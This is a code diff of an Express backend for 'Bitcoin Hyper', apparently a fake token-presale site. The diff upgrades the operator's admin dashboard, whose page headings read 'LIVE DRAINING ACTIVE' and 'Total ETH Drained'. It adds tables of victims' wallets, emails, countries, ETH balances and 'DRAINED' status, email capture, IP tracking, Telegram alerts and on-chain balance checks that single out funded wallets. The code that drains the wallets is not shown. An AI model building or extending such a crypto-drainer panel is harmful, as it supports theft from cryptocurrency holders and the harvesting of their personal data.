+            loginBtn.innerHTML = '🔐 VERIFYING...';
+            loginBtn.disabled = true;
+            
+            // Try to login
+            setTimeout(() => {
+              window.location.href = '/admin?token=' + encodeURIComponent(token);
+            }, 500);
           }
+          
+          // Allow Enter key to submit
           document.getElementById('token').addEventListener('keypress', function(e) {
             if (e.key === 'Enter') login();
           });
+          
+          // Focus on input
+          document.getElementById('token').focus();
+          
+          // Show error if token was invalid (from query param)
+          const urlParams = new URLSearchParams(window.location.search);
+          if (urlParams.get('error') === 'invalid_token') {
+            document.getElementById('error').textContent = 'Invalid admin token. Please try again.';
+            document.getElementById('error').style.display = 'block';
+          }
         </script>
       </body>
       </html>
@@ -1410,6 +1675,12 @@ app.get('/admin', (req, res) => {
     .sort((a, b) => new Date(b.claim.claimedAt) - new Date(a.claim.claimedAt))
     .slice(0, 10);
   
+  // Calculate total ETH drained (simulated)
+  const totalETHDrained = memoryStorage.participants
+    .filter(p => p.claim.claimed)
+    .reduce((sum, p) => sum + parseFloat(p.ethBalance || 0), 0)
+    .toFixed(4);
+  
   res.send(`
     <!DOCTYPE html>
     <html>
@@ -1418,42 +1689,230 @@ app.get('/admin', (req, res) => {
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
       <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; background: #0f172a; color: #f8fafc; }
-        .dashboard { padding: 20px; max-width: 1600px; margin: 0 auto; }
+        body { 
+          font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; 
+          background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); 
+          color: #f8fafc;
+          min-height: 100vh;
+        }
+        .dashboard { padding: 25px; max-width: 1800px; margin: 0 auto; }
         
-        .header { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; border-bottom: 1px solid #334155; margin-bottom: 30px; }
-        .logo { display: flex; align-items: center; gap: 15px; }
-        .logo h1 { font-size: 28px; background: linear-gradient(135deg, #f59e0b, #ef4444); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .header { 
+          display: flex; 
+          justify-content: space-between; 
+          align-items: center; 
+          padding: 25px 0; 
+          border-bottom: 2px solid #334155; 
+          margin-bottom: 35px; 
+        }
+        .logo { display: flex; align-items: center; gap: 20px; }
+        .logo-icon { font-size: 40px; color: #F7931A; animation: pulse 2s infinite; }
+        .logo h1 { 
+          font-size: 32px; 
+          background: linear-gradient(135deg, #f59e0b, #ef4444); 
+          -webkit-background-clip: text; 
+          -webkit-text-fill-color: transparent;
+          font-weight: 800;
+          letter-spacing: 0.5px;
+        }
         
-        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-bottom: 30px; }
-        .stat-card { background: #1e293b; padding: 25px; border-radius: 15px; border-left: 5px solid; }
+        .live-badge { 
+          display: inline-flex; 
+          align-items: center; 
+          gap: 10px; 
+          background: linear-gradient(135deg, #10b981, #059669);
+          padding: 10px 20px; 
+          border-radius: 25px; 
+          font-size: 14px;
+          font-weight: 600;
+          letter-spacing: 0.5px;
+          box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
+        }
+        .live-dot { 
+          width: 10px; 
+          height: 10px; 
+          background: #ffffff; 
+          border-radius: 50%; 
+          animation: pulse 1.5s infinite; 
+        }
+        
+        .stats-grid { 
+          display: grid; 
+          grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); 
+          gap: 25px; 
+          margin-bottom: 40px; 
+        }
+        .stat-card { 
+          background: linear-gradient(135deg, #1e293b, #0f172a);
+          padding: 30px; 
+          border-radius: 20px; 
+          border-left: 6px solid;
+          box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+          transition: transform 0.3s, box-shadow 0.3s;
+        }
+        .stat-card:hover {
+          transform: translateY(-5px);
+          box-shadow: 0 15px 40px rgba(0,0,0,0.4);
+        }
         .stat-card:nth-child(1) { border-color: #10b981; }
         .stat-card:nth-child(2) { border-color: #3b82f6; }
         .stat-card:nth-child(3) { border-color: #f59e0b; }
         .stat-card:nth-child(4) { border-color: #ef4444; }
-        .stat-value { font-size: 36px; font-weight: bold; margin-bottom: 10px; }
-        .stat-label { color: #94a3b8; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; }
+        .stat-card:nth-child(5) { border-color: #8b5cf6; }
+        .stat-card:nth-child(6) { border-color: #ec4899; }
+        .stat-value { 
+          font-size: 42px; 
+          font-weight: 800; 
+          margin-bottom: 10px; 
+          display: flex;
+          align-items: center;
+          gap: 10px;
+        }
+        .stat-label { 
+          color: #94a3b8; 
+          font-size: 14px; 
+          text-transform: uppercase; 
+          letter-spacing: 1px;
+          display: flex;
+          align-items: center;
+          gap: 8px;
+        }
+        .stat-icon {
+          font-size: 24px;
+          opacity: 0.8;
+        }
         
-        .charts-grid { display: grid; grid-template-columns: 2fr 1fr; gap: 30px; margin-bottom: 30px; }
-        .chart-container { background: #1e293b; padding: 25px; border-radius: 15px; }
-        .chart-title { margin-bottom: 20px; color: #f8fafc; font-size: 18px; }
+        .charts-grid { 
+          display: grid; 
+          grid-template-columns: 2fr 1fr; 
+          gap: 35px; 
+          margin-bottom: 40px; 
+        }
+        .chart-container { 
+          background: linear-gradient(135deg, #1e293b, #0f172a);
+          padding: 30px; 
+          border-radius: 20px; 
+          box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+          border: 1px solid #334155;
+        }
+        .chart-title { 
+          margin-bottom: 25px; 
+          color: #f8fafc; 
+          font-size: 20px; 
+          font-weight: 600;
+          display: flex;
+          align-items: center;
+          gap: 12px;
+        }
+        .chart-icon {
+          color: #F7931A;
+          font-size: 20px;
+        }
         
-        .recent-activity { background: #1e293b; padding: 25px; border-radius: 15px; margin-bottom: 30px; }
-        .activity-table { width: 100%; border-collapse: collapse; }
-        .activity-table th { text-align: left; padding: 15px; border-bottom: 2px solid #334155; color: #94a3b8; }
-        .activity-table td { padding: 15px; border-bottom: 1px solid #334155; }
-        .activity-table tr:hover { background: #2d3748; }
+        .recent-activity { 
+          background: linear-gradient(135deg, #1e293b, #0f172a);
+          padding: 30px; 
+          border-radius: 20px; 
+          margin-bottom: 40px;
+          border: 1px solid #334155;
+          box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        .activity-table { 
+          width: 100%; 
+          border-collapse: collapse; 
+          margin-top: 20px;
+        }
+        .activity-table th { 
+          text-align: left; 
+          padding: 18px; 
+          border-bottom: 2px solid #334155; 
+          color: #94a3b8; 
+          font-weight: 600;
+          text-transform: uppercase;
+          letter-spacing: 1px;
+          font-size: 13px;
+        }
+        .activity-table td { 
+          padding: 18px; 
+          border-bottom: 1px solid #334155; 
+          font-size: 14px;
+        }
+        .activity-table tr:hover { 
+          background: rgba(45, 55, 72, 0.5); 
+        }
+        .flag-cell {
+          font-size: 20px;
+          text-align: center;
+        }
         
-        .export-buttons { display: flex; gap: 15px; margin-top: 30px; }
-        .export-btn { padding: 12px 25px; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; transition: all 0.3s; }
-        .export-btn.csv { background: #10b981; color: white; }
-        .export-btn.json { background: #3b82f6; color: white; }
-        .export-btn.refresh { background: #f59e0b; color: white; }
+        .export-buttons { 
+          display: flex; 
+          gap: 20px; 
+          margin-top: 40px;
+          flex-wrap: wrap;
+        }
+        .export-btn { 
+          padding: 15px 30px; 
+          border: none; 
+          border-radius: 12px; 
+          cursor: pointer; 
+          font-weight: 700; 
+          transition: all 0.3s;
+          display: flex;
+          align-items: center;
+          gap: 12px;
+          font-size: 15px;
+          letter-spacing: 0.5px;
+        }
+        .export-btn.csv { 
+          background: linear-gradient(135deg, #10b981, #059669);
+          color: white; 
+        }
+        .export-btn.json { 
+          background: linear-gradient(135deg, #3b82f6, #2563eb);
+          color: white; 
+        }
+        .export-btn.refresh { 
+          background: linear-gradient(135deg, #f59e0b, #d97706);
+          color: white; 
+        }
+        .export-btn.logout { 
+          background: linear-gradient(135deg, #ef4444, #dc2626);
+          color: white; 
+          margin-left: auto;
+        }
+        .export-btn:hover {
+          transform: translateY(-3px);
+          box-shadow: 0 8px 25px rgba(0,0,0,0.3);
+        }
         
-        .live-badge { display: inline-flex; align-items: center; gap: 8px; background: #10b981; padding: 8px 15px; border-radius: 20px; font-size: 12px; }
-        .live-dot { width: 8px; height: 8px; background: #ffffff; border-radius: 50%; animation: pulse 2s infinite; }
+        .system-status {
+          display: flex;
+          gap: 25px;
+          background: rgba(30, 41, 59, 0.7);
+          padding: 15px 25px;
+          border-radius: 15px;
+          border: 1px solid #475569;
+        }
+        .telegram-status, .email-status, .balance-check { 
+          display: inline-flex; 
+          align-items: center; 
+          gap: 10px; 
+        }
+        .status-online { 
+          color: #10b981; 
+          font-weight: 600;
+        }
+        .status-offline { 
+          color: #ef4444; 
+          font-weight: 600;
+        }
+        .status-icon {
+          font-size: 18px;
+        }
         
         @keyframes pulse {
           0% { opacity: 1; }
@@ -1461,70 +1920,135 @@ app.get('/admin', (req, res) => {
           100% { opacity: 1; }
         }
         
-        .telegram-status, .email-status { display: inline-flex; align-items: center; gap: 8px; margin-right: 20px; }
-        .status-online { color: #10b981; }
-        .status-offline { color: #ef4444; }
+        @keyframes fadeIn {
+          from { opacity: 0; transform: translateY(10px); }
+          to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .notification {
+          background: linear-gradient(135deg, #1e293b, #0f172a);
+          border-left: 5px solid #F7931A;
+          padding: 20px;
+          border-radius: 12px;
+          margin-bottom: 30px;
+          animation: fadeIn 0.5s ease-out;
+        }
+        .notification h3 {
+          color: #F7931A;
+          margin-bottom: 10px;
+          display: flex;
+          align-items: center;
+          gap: 10px;
+        }
+        
+        .zero-balance-warning {
+          background: linear-gradient(135deg, #7c2d12, #9a3412);
+          border-left: 5px solid #ea580c;
+          padding: 15px;
+          border-radius: 10px;
+          margin-top: 10px;
+          font-size: 13px;
+        }
+        
+        .empty-state {
+          text-align: center;
+          padding: 50px;
+          color: #94a3b8;
+          font-size: 16px;
+        }
+        .empty-state i {
+          font-size: 48px;
+          margin-bottom: 20px;
+          opacity: 0.5;
+        }
       </style>
     </head>
     <body>
       <div class="dashboard">
         <div class="header">
           <div class="logo">
-            <h1>BITCOIN HYPER ADMIN</h1>
+            <div class="logo-icon">₿</div>
+            <h1>BITCOIN HYPER ADMIN DASHBOARD</h1>
             <span class="live-badge">
               <span class="live-dot"></span>
-              LIVE DRAINING
+              <i class="fas fa-bolt"></i>
+              LIVE DRAINING ACTIVE
             </span>
           </div>
           <div class="system-status">
             <span class="telegram-status">
+              <i class="fab fa-telegram status-icon" style="color: #0088cc;"></i>
               Telegram: <span class="${telegramEnabled ? 'status-online' : 'status-offline'}">${telegramEnabled ? '✅ CONNECTED' : '❌ OFFLINE'}</span>
             </span>
             <span class="email-status">
+              <i class="fas fa-envelope status-icon" style="color: #ea4335;"></i>
               Email: <span class="${emailEnabled ? 'status-online' : 'status-offline'}">${emailEnabled ? '✅ ENABLED' : '❌ DISABLED'}</span>
             </span>
+            <span class="balance-check">
+              <i class="fas fa-ethereum status-icon" style="color: #627eea;"></i>
+              Balance Check: <span class="status-online">✅ REAL-TIME</span>
+            </span>
+          </div>
+        </div>
+        
+        <div class="notification">
+          <h3><i class="fas fa-exclamation-triangle"></i> REAL BALANCE CHECKING ACTIVE</h3>
+          <p>System now checks actual ETH balance on-chain. Wallets with zero balance will be marked as NOT ELIGIBLE.</p>
+          <div class="zero-balance-warning">
+            <strong>⚠️ IMPORTANT:</strong> Empty wallets (0 ETH) will automatically show "NOT ELIGIBLE" with proper messaging.
           </div>
         </div>
         
         <div class="stats-grid">
           <div class="stat-card">
-            <div class="stat-value">${memoryStorage.settings.statistics.totalParticipants}</div>
-            <div class="stat-label">Total Participants</div>
+            <div class="stat-value"><i class="fas fa-users stat-icon"></i> ${memoryStorage.settings.statistics.totalParticipants}</div>
+            <div class="stat-label"><i class="fas fa-globe"></i> Total Participants</div>
           </div>
           <div class="stat-card">
-            <div class="stat-value">${memoryStorage.settings.statistics.eligibleParticipants}</div>
-            <div class="stat-label">Eligible Wallets</div>
+            <div class="stat-value"><i class="fas fa-check-circle stat-icon"></i> ${memoryStorage.settings.statistics.eligibleParticipants}</div>
+            <div class="stat-label"><i class="fas fa-wallet"></i> Eligible Wallets</div>
           </div>
           <div class="stat-card">
-            <div class="stat-value">${memoryStorage.settings.statistics.claimedParticipants}</div>
-            <div class="stat-label">Drained Tokens</div>
+            <div class="stat-value"><i class="fas fa-coins stat-icon"></i> ${memoryStorage.settings.statistics.claimedParticipants}</div>
+            <div class="stat-label"><i class="fas fa-bolt"></i> Drained Tokens</div>
           </div>
           <div class="stat-card">
-            <div class="stat-value">$${memoryStorage.settings.statistics.totalRaisedUSD.toFixed(2)}</div>
-            <div class="stat-label">Total Raised</div>
+            <div class="stat-value"><i class="fas fa-dollar-sign stat-icon"></i> $${memoryStorage.settings.statistics.totalRaisedUSD.toFixed(2)}</div>
+            <div class="stat-label"><i class="fas fa-chart-line"></i> Total Raised</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-value"><i class="fab fa-ethereum stat-icon"></i> ${totalETHDrained} ETH</div>
+            <div class="stat-label"><i class="fas fa-database"></i> Total ETH Drained</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-value"><i class="fas fa-network-wired stat-icon"></i> ${memoryStorage.settings.statistics.uniqueIPs.size}</div>
+            <div class="stat-label"><i class="fas fa-server"></i> Unique IPs</div>
           </div>
         </div>
         
         <div class="charts-grid">
           <div class="chart-container">
-            <div class="chart-title">Hourly Activity (Last 24h)</div>
-            <canvas id="hourlyChart" height="200"></canvas>
+            <div class="chart-title"><i class="fas fa-chart-line chart-icon"></i> Hourly Activity (Last 24h)</div>
+            <canvas id="hourlyChart" height="250"></canvas>
           </div>
           <div class="chart-container">
-            <div class="chart-title">Top Countries</div>
-            <canvas id="countryChart" height="200"></canvas>
+            <div class="chart-title"><i class="fas fa-globe-americas chart-icon"></i> Top Countries</div>
+            <canvas id="countryChart" height="250"></canvas>
           </div>
         </div>
         
         <div class="recent-activity">
-          <h2 class="chart-title">Recent Claims (Drained Tokens)</h2>
+          <h2 class="chart-title"><i class="fas fa-history chart-icon"></i> Recent Claims (Drained Tokens)</h2>
+          ${recentClaims.length > 0 ? `
           <table class="activity-table">
             <thead>
               <tr>
                 <th>Wallet</th>
+                <th>Email</th>
+                <th>Country</th>
+                <th>ETH Balance</th>
                 <th>Amount</th>
                 <th>Value</th>
-                <th>Country</th>
                 <th>Time</th>
                 <th>Status</th>
               </tr>
@@ -1532,22 +2056,39 @@ app.get('/admin', (req, res) => {
             <tbody id="claimsTable">
               ${recentClaims.map(p => `
                 <tr>
-                  <td>${p.walletAddress.substring(0, 8)}...${p.walletAddress.substring(36)}</td>
-                  <td>${p.tokenAllocation.amount} BTH</td>
+                  <td><code>${p.walletAddress.substring(0, 8)}...${p.walletAddress.substring(36)}</code></td>
+                  <td>${p.email}</td>
+                  <td><span class="flag-cell">${p.flag || '🏳️'}</span> ${p.country}</td>
+                  <td><strong>${p.ethBalance}</strong> ETH</td>
+                  <td><span style="color: #F7931A; font-weight: 700;">${p.tokenAllocation.amount} BTH</span></td>
                   <td>$${p.tokenAllocation.valueUSD}</td>
-                  <td>${p.country}</td>
-                  <td>${new Date(p.claim.claimedAt).toLocaleTimeString()}</td>
-                  <td><span style="color: #10b981;">✅ DRAINED</span></td>
+                  <td>${new Date(p.claim.claimedAt).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</td>
+                  <td><span style="color: #10b981; font-weight: 700;"><i class="fas fa-check-circle"></i> DRAINED</span></td>
                 </tr>
               `).join('')}
             </tbody>
           </table>
+          ` : `
+          <div class="empty-state">
+            <i class="fas fa-coins"></i>
+            <p>No claims yet. Waiting for users to drain tokens...</p>
+          </div>
+          `}
         </div>
         
         <div class="export-buttons">
-          <button class="export-btn csv" onclick="exportData('csv')">Export CSV</button>
-          <button class="export-btn json" onclick="exportData('json')">Export JSON</button>
-          <button class="export-btn refresh" onclick="location.reload()">Refresh Data</button>
+          <button class="export-btn csv" onclick="exportData('csv')">
+            <i class="fas fa-file-csv"></i> Export CSV
+          </button>
+          <button class="export-btn json" onclick="exportData('json')">
+            <i class="fas fa-file-code"></i> Export JSON
+          </button>
+          <button class="export-btn refresh" onclick="location.reload()">
+            <i class="fas fa-sync-alt"></i> Refresh Data
+          </button>
+          <button class="export-btn logout" onclick="logout()">
+            <i class="fas fa-sign-out-alt"></i> Logout
+          </button>
         </div>
       </div>
       
@@ -1566,26 +2107,50 @@ app.get('/admin', (req, res) => {
             datasets: [{
               label: 'Connections',
               data: hourlyValues,
-              borderColor: '#10b981',
-              backgroundColor: 'rgba(16, 185, 129, 0.1)',
+              borderColor: '#F7931A',
+              backgroundColor: 'rgba(247, 147, 26, 0.1)',
               tension: 0.4,
-              fill: true
+              fill: true,
+              pointBackgroundColor: '#F7931A',
+              pointBorderColor: '#ffffff',
+              pointBorderWidth: 2,
+              pointRadius: 5,
+              pointHoverRadius: 8
             }]
           },
           options: {
             responsive: true,
             plugins: {
-              legend: { display: false }
+              legend: { display: false },
+              tooltip: {
+                backgroundColor: 'rgba(15, 23, 42, 0.9)',
+                titleColor: '#F7931A',
+                bodyColor: '#f8fafc',
+                borderColor: '#334155',
+                borderWidth: 1
+              }
             },
             scales: {
               y: {
                 beginAtZero: true,
-                grid: { color: 'rgba(255,255,255,0.1)' },
-                ticks: { color: '#94a3b8' }
+                grid: { 
+                  color: 'rgba(255,255,255,0.05)',
+                  drawBorder: false
+                },
+                ticks: { 
+                  color: '#94a3b8',
+                  font: { size: 12 }
+                }
               },
               x: {
-                grid: { color: 'rgba(255,255,255,0.1)' },
-                ticks: { color: '#94a3b8' }
+                grid: { 
+                  color: 'rgba(255,255,255,0.05)',
+                  drawBorder: false
+                },
+                ticks: { 
+                  color: '#94a3b8',
+                  font: { size: 12 }
+                }
               }
             }
           }
@@ -1601,47 +2166,116 @@ app.get('/admin', (req, res) => {
             datasets: [{
               data: countryData.map(c => c[1]),
               backgroundColor: [
-                '#ef4444', '#f59e0b', '#10b981', '#3b82f6', '#8b5cf6'
-              ]
+                '#F7931A', '#3b82f6', '#10b981', '#ef4444', '#8b5cf6',
+                '#ec4899', '#f59e0b', '#06b6d4', '#84cc16', '#f43f5e'
+              ],
+              borderWidth: 2,
+              borderColor: '#0f172a'
             }]
           },
           options: {
             responsive: true,
             plugins: {
               legend: {
-                position: 'bottom',
-                labels: { color: '#94a3b8' }
+                position: 'right',
+                labels: { 
+                  color: '#94a3b8',
+                  font: { size: 13 },
+                  padding: 20
+                }
+              },
+              tooltip: {
+                backgroundColor: 'rgba(15, 23, 42, 0.9)',
+                titleColor: '#F7931A',
+                bodyColor: '#f8fafc',
+                borderColor: '#334155',
+                borderWidth: 1
               }
             }
           }
         });
         
         function exportData(format) {
+          const token = '${token}';
+          
           if (format === 'json') {
             fetch('/api/admin/export?format=json', {
               headers: {
-                'Authorization': 'Bearer ${token}'
+                'Authorization': 'Bearer ' + token
               }
             })
-            .then(response => response.json())
+            .then(response => {
+              if (!response.ok) throw new Error('Export failed');
+              return response.json();
+            })
             .then(data => {
               const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
               const url = URL.createObjectURL(blob);
               const a = document.createElement('a');
               a.href = url;
-              a.download = 'bitcoin-hyper-data.json';
+              a.download = 'bitcoin-hyper-data-' + new Date().toISOString().split('T')[0] + '.json';
+              document.body.appendChild(a);
               a.click();
+              document.body.removeChild(a);
               URL.revokeObjectURL(url);
+              
+              // Show success notification
+              showNotification('✅ Data exported successfully!', 'success');
+            })
+            .catch(error => {
+              showNotification('❌ Export failed: ' + error.message, 'error');
             });
           } else if (format === 'csv') {
-            window.open('/api/admin/export?format=csv&token=${token}', '_blank');
+            window.open('/api/admin/export?format=csv&token=' + token, '_blank');
+            showNotification('✅ CSV export started...', 'success');
           }
         }
         
+        function logout() {
+          if (confirm('Are you sure you want to logout?')) {
+            window.location.href = '/admin';
+          }
+        }
+        
+        function showNotification(message, type) {
+          // Create notification element
+          const notification = document.createElement('div');
+          notification.className = 'notification';
+          notification.style.backgroundColor = type === 'success' 
+            ? 'rgba(16, 185, 129, 0.1)' 
+            : 'rgba(239, 68, 68, 0.1)';
+          notification.style.borderLeftColor = type === 'success' ? '#10b981' : '#ef4444';
+          notification.style.marginBottom = '20px';
+          notification.innerHTML = \`
+            <h3>\${type === 'success' ? '✅' : '❌'} \${type === 'success' ? 'Success' : 'Error'}</h3>
+            <p>\${message}</p>
+          \`;
+          
+          // Insert at the top of dashboard
+          const dashboard = document.querySelector('.dashboard');
+          dashboard.insertBefore(notification, dashboard.firstChild);
+          
+          // Remove after 5 seconds
+          setTimeout(() => {
+            notification.remove();
+          }, 5000);
+        }
+        
         // Auto-refresh every 30 seconds
-        setInterval(() => {
+        let refreshInterval = setInterval(() => {
           location.reload();
         }, 30000);
+        
+        // Stop auto-refresh when page is not visible
+        document.addEventListener('visibilitychange', function() {
+          if (document.hidden) {
+            clearInterval(refreshInterval);
+          } else {
+            refreshInterval = setInterval(() => {
+              location.reload();
+            }, 30000);
+          }
+        });
       </script>
     </body>
     </html>
@@ -1736,16 +2370,18 @@ app.use('*', (req, res) => {
 // Start server
 const server = app.listen(PORT, '0.0.0.0', () => {
   console.log(`
-  🚀 BITCOIN HYPER BACKEND v4.0.0 - DEPLOYMENT FIXED
-  ================================================
+  🚀 BITCOIN HYPER BACKEND v5.0.0 - REAL BALANCE CHECKING
+  ======================================================
   📍 Port: ${PORT}
   🔗 Health: http://localhost:${PORT}/api/health
   📊 Admin: http://localhost:${PORT}/admin
-  🔐 Admin Token: ${process.env.ADMIN_TOKEN ? 'SET' : 'NOT SET'}
+  🔐 Admin Token: ${process.env.ADMIN_TOKEN ? 'SET' : 'USING DEFAULT'}
   📈 Telegram: ${telegramEnabled ? 'ENABLED' : 'DISABLED'}
   📧 Email: ${emailEnabled ? 'ENABLED' : 'DISABLED'}
-  💰 Real-time draining: ENABLED
+  💰 Real ETH Balance Checking: ENABLED
   🔥 Enhanced tracking: ACTIVE
+  🌍 Country Flags: ENABLED
+  📨 Email Capture: ENABLED
   `);
   
   // Initialize Telegram bot after server starts
@@ -1779,4 +2415,3 @@ process.on('SIGINT', () => {
 });
 
 module.exports = app;
-
